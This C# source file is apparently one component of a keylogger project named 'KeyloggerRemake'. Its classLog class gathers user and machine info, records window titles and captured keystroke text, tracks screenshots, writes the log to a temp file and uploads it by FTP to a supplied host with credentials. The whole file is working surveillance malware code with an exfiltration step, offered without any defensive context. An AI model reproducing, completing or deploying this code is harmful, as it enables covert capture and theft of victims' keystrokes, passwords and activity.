using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;

namespace KeyloggerRemake
{
    public class classLog
    {
        public String strLog;
        private String strUserInfo;
        private String strLogStartDateTime;
        public String strLogEndDateTime;
        private String strLogShortDateTime;

        public Queue<classScreenshot> stkScreenshots = new Queue<classScreenshot>();

        public classLog()
        {
            strUserInfo = classGetUserInfo.getUserInfo();
            strLogStartDateTime = classGetUserInfo.getDateAndTime();
        }

        public String addToLog(String strInfo)
        {
            strLog += strInfo;
            return strInfo;
        }

        public String printStartedLog()
        {
            return ("---------------------------------------------------------------------------------" + Environment.NewLine
                 + "KeyLogger started at: " + strLogStartDateTime
                 + strUserInfo + Environment.NewLine
                 + "---------------------------------------------------------------------------------" + Environment.NewLine);
        }

        public String printStoppedLog()
        {
            strLogEndDateTime = classGetUserInfo.getDateAndTime();

            return (Environment.NewLine 
                 + "---------------------------------------------------------------------------------" + Environment.NewLine
                 + "KeyLogger stopped at: " + strLogEndDateTime
                 + strUserInfo + Environment.NewLine
                 + "---------------------------------------------------------------------------------" + Environment.NewLine);
        }

        public String printNewWindow()
        {
            strLogShortDateTime = classGetUserInfo.getShortDTime();

            return (Environment.NewLine + "----------------------------------------------------------------------------" + Environment.NewLine
                 + "New window found at: " + strLogShortDateTime + Environment.NewLine
                 + "Window: " + classGetUserInfo.strCurrentWindow + Environment.NewLine
                 + "----------------------------------------------------------------------------" + Environment.NewLine);
        }

        public void saveLog(String strHost, String strUser, String strPass)
        {
            strLogShortDateTime = classGetUserInfo.getShortDTime();

            String strLogName = "\\Log " + strLogShortDateTime + ".txt";
            String strLogFile = Path.GetTempPath() + strLogName;

            using (StreamWriter swWriter = new StreamWriter(strLogFile))
            {
                swWriter.Write(strLog);
            }

            classFTP.uploadLog(strHost, strUser, strPass, strLogName, strLogFile);
        }
        
        public bool checkScreenshots(String strScreenshotName)
        {
            bool blScreenshotExists = stkScreenshots.Any(s => s.strScreenshotName == strScreenshotName);

            return blScreenshotExists;
        }       
    }
}
